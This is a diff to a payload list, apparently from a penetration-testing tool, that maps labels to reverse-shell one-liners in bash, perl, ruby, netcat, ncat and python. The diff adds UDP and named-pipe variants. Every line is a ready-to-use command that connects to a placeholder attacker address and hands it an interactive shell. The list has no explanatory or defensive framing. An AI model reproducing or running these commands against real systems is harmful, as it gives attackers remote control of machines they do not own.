@@ -1,4 +1,5 @@
 BASH REVERSE SHELL|bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1
+BASH REVERSE SHELL|bash -i >& /dev/udp/[IPADDR]/[PORT] 0>&1
 BASH REVERSE SHELL|0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196
 BASH REVERSE SHELL|exec 5<> /dev/tcp/[IPADDR]/[PORT]; cat <&5 | while read line; do $line 2>&5>&5; done
 PERL REVERSE SHELL|perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -9,9 +10,11 @@ RUBY REVERSE SHELL|ruby -rsocket -e'f=TCPSocket.open("[IPADDR]",[PORT]).to_i;exe
 RUBY REVERSE SHELL WINDOWS|ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 NETCAT REVERSE SHELL|nc -c /bin/sh [IPADDR] [PORT]
 NETCAT REVERSE SHELL|nc -e /bin/sh [IPADDR] [PORT]
+NETCAT REVERSE SHELL|nc --udp -e /bin/sh [IPADDR] [PORT]
 NETCAT REVERSE SHELL|/bin/sh | nc [IPADDR] [PORT]
 NETCAT REVERSE SHELL|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IPADDR] [PORT] >/tmp/f
 NETCAT REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && nc [IPADDR] [PORT] 0/tmp/p
+NETCAT REVErSE SHELL|rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc [IPADDR] [PORT] 1>/tmp/bkpipe
 NCAT REVERSE SHELL|ncat [IPADDR] [PORT] -e /bin/sh
 PYTHON REVERSE SHELL|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 PYTHON REVERSE SHELL|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
